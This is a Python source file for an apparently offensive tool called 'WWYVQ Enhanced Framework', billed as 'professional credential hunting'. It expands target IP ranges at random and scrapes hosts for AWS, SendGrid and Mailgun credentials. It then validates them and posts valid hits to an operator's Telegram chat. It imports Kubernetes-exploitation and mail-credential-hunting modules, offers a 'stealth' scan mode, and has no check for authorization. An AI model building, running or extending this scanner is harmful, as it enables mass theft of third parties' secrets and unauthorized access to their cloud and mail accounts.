#!/usr/bin/env python3
"""
🚀 WWYVQ ENHANCED FRAMEWORK - Professional Credential Hunting
Enhanced version with real validation, professional notifications, and organized results
Author: wKayaa | 2025
"""

import asyncio
import argparse
import sys
import os
import time
import json
import random
import ipaddress
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional, Any
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('wwyvq_enhanced.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Import enhanced modules
try:
    from enhanced_credential_validator import EnhancedCredentialValidator
    from professional_telegram_notifier import ProfessionalTelegramNotifier, TelegramConfig
    from organized_results_manager import OrganizedResultsManager
    
    # Import existing modules
    from kubernetes_advanced import (
        KubernetesAdvancedExploitation,
        WWYVQv5KubernetesOrchestrator,
        ExploitationConfig,
        ExploitationMode
    )
    from k8s_exploit_master import K8sExploitMaster
    from mail_services_hunter import MailServicesHunter
    
    logger.info("✅ All enhanced modules loaded successfully")
    
except ImportError as e:
    logger.error(f"❌ Import error: {e}")
    sys.exit(1)

class WWYVQEnhancedFramework:
    """Enhanced WWYVQ Framework with professional features"""
    
    def __init__(self, config_file: Optional[str] = None):
        self.config = self._load_config(config_file)
        self.session_id = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.start_time = datetime.now()
        
        # Initialize components
        self.results_manager = OrganizedResultsManager()
        self.credential_validator = None
        self.telegram_notifier = None
        
        # Statistics
        self.stats = {
            'clusters_scanned': 0,
            'endpoints_tested': 0,
            'credentials_found': 0,
            'credentials_validated': 0,
            'notifications_sent': 0,
            'errors': 0
        }
        
        # Initialize Telegram if configured
        if self.config.get('telegram', {}).get('enabled', False):
            telegram_config = TelegramConfig(
                bot_token=self.config['telegram']['bot_token'],
                chat_id=self.config['telegram']['chat_id'],
                enabled=True,
                rate_limit_delay=self.config['telegram'].get('rate_limit_delay', 1.0)
            )
            self.telegram_notifier = ProfessionalTelegramNotifier(telegram_config)
        
        logger.info(f"🚀 WWYVQ Enhanced Framework initialized - Session: {self.session_id}")
    
    def _load_config(self, config_file: Optional[str] = None) -> Dict[str, Any]:
        """Load configuration from file or use defaults"""
        default_config = {
            'telegram': {
                'enabled': False,
                'bot_token': '',
                'chat_id': '',
                'rate_limit_delay': 1.0
            },
            'scanning': {
                'max_concurrent': 50,
                'timeout': 10,
                'retry_attempts': 3
            },
            'cidr': {
                'expand_cidrs': True,
                'max_ips_per_cidr': 100,
                'randomize_ips': True,
                'include_ipv6': False
            },
            'validation': {
                'enabled': True,
                'confidence_threshold': 75.0,
                'validate_aws': True,
                'validate_sendgrid': True,
                'validate_mailgun': True
            },
            'results': {
                'save_all': True,
                'save_validated_only': False,
                'export_json': True,
                'export_csv': True
            }
        }
        
        if config_file and os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    user_config = json.load(f)
                    # Merge with defaults
                    for key, value in user_config.items():
                        if isinstance(value, dict) and key in default_config:
                            default_config[key].update(value)
                        else:
                            default_config[key] = value
            except Exception as e:
                logger.error(f"❌ Error loading config file: {e}")
        
        return default_config
    
    def _expand_cidr_targets(self, targets: List[str]) -> List[str]:
        """
        Expand CIDR ranges into individual IP addresses
        
        Args:
            targets: List of targets (IPs, URLs, CIDR ranges)
            
        Returns:
            List of expanded targets with CIDR ranges converted to individual IPs
        """
        if not self.config['cidr']['expand_cidrs']:
            logger.info("🔄 CIDR expansion disabled in configuration")
            return targets
            
        expanded_targets = []
        cidr_stats = {
            'total_cidrs': 0,
            'total_ips_generated': 0,
            'skipped_cidrs': 0
        }
        
        max_ips = self.config['cidr']['max_ips_per_cidr']
        randomize = self.config['cidr']['randomize_ips']
        include_ipv6 = self.config['cidr']['include_ipv6']
        
        logger.info(f"🎯 Expanding CIDR ranges (max {max_ips} IPs per CIDR, randomize: {randomize})")
        
        for target in targets:
            target = target.strip()
            
            # Skip empty lines and comments
            if not target or target.startswith('#'):
                continue
                
            # Check if target is a CIDR range
            if '/' in target:
                try:
                    # Try to parse as IP network
                    network = ipaddress.ip_network(target, strict=False)
                    
                    # Skip IPv6 if not enabled
                    if network.version == 6 and not include_ipv6:
                        logger.info(f"⏭️  Skipping IPv6 CIDR {target} (IPv6 disabled)")
                        cidr_stats['skipped_cidrs'] += 1
                        continue
                    
                    # Get all host IPs from the network
                    hosts = list(network.hosts())
                    total_hosts = len(hosts)
                    
                    if total_hosts == 0:
                        logger.warning(f"⚠️  CIDR {target} has no host IPs")
                        continue
                    
                    # Limit number of IPs if needed
                    if total_hosts > max_ips:
                        if randomize:
                            # Randomly sample IPs
                            hosts = random.sample(hosts, max_ips)
                            logger.info(f"🎲 CIDR {target} -> {max_ips} random IPs (out of {total_hosts:,})")
                        else:
                            # Take first N IPs
                            hosts = hosts[:max_ips]
                            logger.info(f"📊 CIDR {target} -> first {max_ips} IPs (out of {total_hosts:,})")
                    else:
                        logger.info(f"📊 CIDR {target} -> {total_hosts} IPs")
                    
                    # Convert to strings and add to expanded targets
                    expanded_targets.extend([str(ip) for ip in hosts])
                    cidr_stats['total_cidrs'] += 1
                    cidr_stats['total_ips_generated'] += len(hosts)
                    
                except ValueError as e:
                    logger.warning(f"⚠️  Invalid CIDR {target}: {e}")
                    # Add as regular target if not a valid CIDR
                    expanded_targets.append(target)
                except Exception as e:
                    logger.error(f"❌ Error expanding CIDR {target}: {e}")
                    cidr_stats['skipped_cidrs'] += 1
            else:
                # Regular IP/URL target
                expanded_targets.append(target)
        
        # Log statistics
        logger.info(f"📈 CIDR Expansion Summary:")
        logger.info(f"   • CIDR ranges processed: {cidr_stats['total_cidrs']}")
        logger.info(f"   • Individual IPs generated: {cidr_stats['total_ips_generated']:,}")
        logger.info(f"   • CIDR ranges skipped: {cidr_stats['skipped_cidrs']}")
        logger.info(f"   • Total targets after expansion: {len(expanded_targets):,}")
        
        return expanded_targets
    
    async def run_enhanced_scan(self, targets: List[str], scan_mode: str = 'standard'):
        """Run enhanced credential scanning with all improvements"""
        logger.info(f"🎯 Starting enhanced scan - Mode: {scan_mode}")
        
        # Send initial notification
        if self.telegram_notifier:
            await self.telegram_notifier.send_real_time_stats({
                'clusters_scanned': 0,
                'endpoints_tested': 0,
                'credentials_found': 0,
                'validation_rate': 0.0,
                'scan_progress': 0.0,
                'scan_speed': 0.0,
                'avg_response_time': 0.0,
                'success_rate': 0.0,
                'error_rate': 0.0,
                'high_value_targets': 0,
                'privileged_access': 0,
                'production_systems': 0,
                'critical_vulns': 0
            })
        
        # Initialize credential validator
        async with EnhancedCredentialValidator() as validator:
            self.credential_validator = validator
            
            # Initialize Telegram notifier
            if self.telegram_notifier:
                async with self.telegram_notifier as notifier:
                    await self._scan_targets(targets, scan_mode)
            else:
                await self._scan_targets(targets, scan_mode)
    
    async def _scan_targets(self, targets: List[str], scan_mode: str):
        """Scan targets with enhanced validation and notifications"""
        total_targets = len(targets)
        processed_targets = 0
        
        for target in targets:
            try:
                logger.info(f"🔍 Scanning target: {target}")
                
                # Scan target for credentials
                raw_credentials = await self._scan_single_target(target)
                
                if raw_credentials:
                    logger.info(f"📊 Found {len(raw_credentials)} potential credentials")
                    
                    # Validate credentials
                    validation_results = await self.credential_validator.validate_credentials(raw_credentials)
                    
                    # Process results
                    for validation_result in validation_results:
                        # Find corresponding raw credential
                        raw_cred = next((c for c in raw_credentials if c['value'] == validation_result.value), None)
                        
                        # Save to organized results
                        self.results_manager.save_credential(validation_result, raw_cred)
                        
                        # Send notification for valid credentials
                        if validation_result.is_valid and self.telegram_notifier:
                            cluster_info = {
                                'endpoint': target,
                                'namespace': 'Unknown',
                                'access_level': 'Unknown',
                                'environment': 'Unknown'
                            }
                            await self.telegram_notifier.send_credential_hit_alert(validation_result, cluster_info)
                            self.stats['notifications_sent'] += 1
                        
                        # Update stats
                        self.stats['credentials_found'] += 1
                        if validation_result.is_valid:
                            self.stats['credentials_validated'] += 1
                
                processed_targets += 1
                self.stats['clusters_scanned'] += 1
                
                # Send periodic updates
                if processed_targets % 10 == 0 and self.telegram_notifier:
                    progress = (processed_targets / total_targets) * 100
                    await self.telegram_notifier.send_real_time_stats({
                        'clusters_scanned': self.stats['clusters_scanned'],
                        'endpoints_tested': self.stats['endpoints_tested'],
                        'credentials_found': self.stats['credentials_found'],
                        'validation_rate': (self.stats['credentials_validated'] / self.stats['credentials_found'] * 100) if self.stats['credentials_found'] > 0 else 0,
                        'scan_progress': progress,
                        'scan_speed': self._calculate_scan_speed(),
                        'avg_response_time': 0.5,  # Placeholder
                        'success_rate': (self.stats['credentials_validated'] / self.stats['credentials_found'] * 100) if self.stats['credentials_found'] > 0 else 0,
                        'error_rate': (self.stats['errors'] / processed_targets * 100) if processed_targets > 0 else 0,
                        'high_value_targets': self.stats['credentials_validated'],
                        'privileged_access': 0,  # Placeholder
                        'production_systems': 0,  # Placeholder
                        'critical_vulns': self.stats['credentials_validated']
                    })
                
            except Exception as e:
                logger.error(f"❌ Error scanning target {target}: {e}")
                self.stats['errors'] += 1
                
                if self.telegram_notifier:
                    await self.telegram_notifier.send_error_alert(
                        "TARGET_SCAN_ERROR",
                        str(e),
                        {'target': target, 'session_id': self.session_id}
                    )
        
        # Final summary
        await self._send_final_summary()
    
    async def _scan_single_target(self, target: str) -> List[Dict[str, Any]]:
        """Scan a single target for credentials"""
        try:
            # Use existing mail services hunter
            mail_hunter = MailServicesHunter()
            
            # Create session for scanning
            import aiohttp
            async with aiohttp.ClientSession() as session:
                credentials = await mail_hunter.hunt_mail_credentials(session, target)
                
                # Also use the enhanced validator's extraction
                if self.credential_validator:
                    # Get webpage content and extract credentials
                    try:
                        async with session.get(target, ssl=False, timeout=10) as response:
                            if response.status == 200:
                                content = await response.text()
                                extracted_creds = self.credential_validator.extract_credentials(content, target)
                                credentials.extend(extracted_creds)
                    except Exception as e:
                        logger.debug(f"Could not fetch content from {target}: {e}")
                
                self.stats['endpoints_tested'] += 1
                return credentials
        
        except Exception as e:
            logger.error(f"❌ Error in single target scan: {e}")
            return []
    
    async def _send_final_summary(self):
        """Send final session summary"""
        # Generate results summary
        summary = self.results_manager.generate_session_summary()
        
        # Send Telegram summary
        if self.telegram_notifier:
            services_found = summary.get('services_found', {})
            await self.telegram_notifier.send_session_summary(
                total_hits=self.stats['credentials_found'],
                valid_hits=self.stats['credentials_validated'],
                services_found=services_found
            )
        
        # Log final stats
        duration = datetime.utcnow() - self.start_time
        logger.info(f"""
🏁 WWYVQ Enhanced Session Complete
{'='*50}
Session ID: {self.session_id}
Duration: {duration}
Clusters Scanned: {self.stats['clusters_scanned']}
Endpoints Tested: {self.stats['endpoints_tested']}
Credentials Found: {self.stats['credentials_found']}
Credentials Validated: {self.stats['credentials_validated']}
Notifications Sent: {self.stats['notifications_sent']}
Errors: {self.stats['errors']}
Results Directory: {self.results_manager.session_dir}
{'='*50}
""")
    
    def _calculate_scan_speed(self) -> float:
        """Calculate current scan speed"""
        duration = datetime.now() - self.start_time
        minutes = duration.total_seconds() / 60
        if minutes > 0:
            return self.stats['clusters_scanned'] / minutes
        return 0.0
    
    def create_sample_config(self, output_file: str = 'wwyvq_config.json'):
        """Create a sample configuration file"""
        sample_config = {
            "telegram": {
                "enabled": True,
                "bot_token": "YOUR_BOT_TOKEN_HERE",
                "chat_id": "YOUR_CHAT_ID_HERE",
                "rate_limit_delay": 1.0
            },
            "scanning": {
                "max_concurrent": 50,
                "timeout": 10,
                "retry_attempts": 3
            },
            "cidr": {
                "expand_cidrs": True,
                "max_ips_per_cidr": 100,
                "randomize_ips": True,
                "include_ipv6": False
            },
            "validation": {
                "enabled": True,
                "confidence_threshold": 75.0,
                "validate_aws": True,
                "validate_sendgrid": True,
                "validate_mailgun": True
            },
            "results": {
                "save_all": True,
                "save_validated_only": False,
                "export_json": True,
                "export_csv": True
            }
        }
        
        with open(output_file, 'w') as f:
            json.dump(sample_config, f, indent=2)
        
        logger.info(f"✅ Sample configuration created: {output_file}")

async def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='WWYVQ Enhanced Framework')
    parser.add_argument('--targets', '-t', help='Targets file path')
    parser.add_argument('--config', '-c', help='Configuration file path')
    parser.add_argument('--mode', '-m', choices=['standard', 'intensive', 'stealth'], 
                       default='standard', help='Scan mode')
    parser.add_argument('--create-config', action='store_true', 
                       help='Create sample configuration file')
    
    # CIDR expansion arguments
    parser.add_argument('--no-cidr-expansion', action='store_true',
                       help='Disable CIDR expansion')
    parser.add_argument('--max-ips-per-cidr', type=int, default=None,
                       help='Maximum IPs to extract from each CIDR range')
    parser.add_argument('--no-randomize-ips', action='store_true',
                       help='Disable randomization of IPs from CIDR ranges')
    parser.add_argument('--include-ipv6', action='store_true',
                       help='Include IPv6 CIDR ranges')
    
    args = parser.parse_args()
    
    # Create sample config if requested
    if args.create_config:
        framework = WWYVQEnhancedFramework()
        framework.create_sample_config()
        return
    
    # Load targets
    if not args.targets:
        logger.error("❌ No targets file specified. Use --targets or -t")
        sys.exit(1)
        
    if not os.path.exists(args.targets):
        logger.error(f"❌ Targets file not found: {args.targets}")
        sys.exit(1)
    
    # Load targets with proper encoding handling
    try:
        with open(args.targets, 'r', encoding='utf-8') as f:
            raw_targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except UnicodeDecodeError:
        # Try with ISO-8859-1 encoding as fallback
        with open(args.targets, 'r', encoding='iso-8859-1') as f:
            raw_targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    if not raw_targets:
        logger.error("❌ No targets found in file")
        sys.exit(1)
    
    logger.info(f"📋 Loaded {len(raw_targets)} raw targets from file")
    
    # Initialize framework
    framework = WWYVQEnhancedFramework(args.config)
    
    # Override CIDR configuration from command line arguments
    if args.no_cidr_expansion:
        framework.config['cidr']['expand_cidrs'] = False
    if args.max_ips_per_cidr is not None:
        framework.config['cidr']['max_ips_per_cidr'] = args.max_ips_per_cidr
    if args.no_randomize_ips:
        framework.config['cidr']['randomize_ips'] = False
    if args.include_ipv6:
        framework.config['cidr']['include_ipv6'] = True
    
    # Expand CIDR ranges
    targets = framework._expand_cidr_targets(raw_targets)
    
    if not targets:
        logger.error("❌ No valid targets after CIDR expansion")
        sys.exit(1)
    
    logger.info(f"🎯 Final target count: {len(targets)} (after CIDR expansion)")
    
    # Run enhanced scan
    await framework.run_enhanced_scan(targets, args.mode)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("👋 Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"❌ Fatal error: {e}")
        sys.exit(1)